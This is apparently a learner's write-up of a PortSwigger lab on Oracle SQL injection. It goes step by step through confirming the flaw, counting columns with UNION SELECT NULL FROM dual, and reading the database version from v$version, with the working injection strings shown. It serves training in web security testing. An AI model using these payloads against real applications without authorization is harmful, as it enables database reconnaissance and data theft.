# Lab: SQL injection attack, querying the database type and version on Oracle

## Description

*This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.*

*To solve the lab, display the database version string.*

## Hint



On Oracle databases, every **SELECT** statement must specify a table to select **FROM**. If your **UNION SELECT** attack does not query from a table, you will still need to include the **FROM** keyword followed by a ***valid*** table name.

There is a built-in table on Oracle called **dual** which you can use for this purpose. For example: UNION SELECT 'abc' FROM **dual**

For more information, see our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

# STEP 1: Verify SQLi

Normal catagory filter for pets:

![image](https://user-images.githubusercontent.com/83407557/169701761-a8123575-4eb3-48da-8a1a-ddbcd7309205.png)

adding a single quote to see if there is a server error

![image](https://user-images.githubusercontent.com/83407557/169701779-390e9fa8-9355-4b32-a3b9-12dcee189bc7.png)

then adding a comment to see if error goes away

![image](https://user-images.githubusercontent.com/83407557/169701797-bf29afa4-7806-4028-9f60-69f6466d50fe.png)

---
# Step 2: Find the number of columns being returned in the query

Now with previous portswigger labs finding the number of columns was as simple as sending increasing numbers of order by clauses or using union select statements. Since I will be using a union select statement for my attack, I will use that as my example:

```sql
UNION SELECT NULL
UNION SELECT NULL, NULL
UNION SELECT NULL, NULL, NULL
...ect 
```

And I would does this until I found the number of columns; however, with an Oracle database I need to call from a **valid** table as per the hint. With this in mind, the query will actually now need to look like this, calling from a universal table called **dual**

```sql
UNION SELECT NULL FROM dual
UNION SELECT NULL, NULL FROM dual
UNION SELECT NULL, NULL, NULL FROM dual
ect.
```

## checking for 1 column

![image](https://user-images.githubusercontent.com/83407557/169702331-aef8065b-8a39-47db-b01e-f61fbb9095e1.png)

## checking for 2 columns

![image](https://user-images.githubusercontent.com/83407557/169702365-1b72c35a-60b4-45f2-93ef-a711a68d369c.png)

no error means two columns are being returned with our query

---

# STEP 3 Find which columns return string data

## Checking column 1

```sql
UNION SELECT 'abc', NULL FROM dual
```
I see abc returned on the page, letting me know column 1 is returning string data

## checking column 2

*leaving abc in column 1 since I know it will not error the server*

```sql
UNION SELECT 'abc', 'def' FROM dual
```

![image](https://user-images.githubusercontent.com/83407557/169703050-7f13eca4-fdb5-4974-b5cf-a90906090377.png)

with this I see that both columns will return string data.

---

# STEP 4 Display target info

I know that I need to display the version string, let's use the cheatsheat as a ref to see how that is done in oracle:

![image](https://user-images.githubusercontent.com/83407557/169703160-8e87bc12-d1c9-4fe6-b3ac-d0c681d58295.png)

So we could potentially display both of these strings in our two columns:

```sql
UNION SELECT version, banner FROM v$instance, v$version
```
![image](https://user-images.githubusercontent.com/83407557/169703411-9bcf2526-3526-4523-a3aa-050bd0ba1325.png)

Which solves the lab.
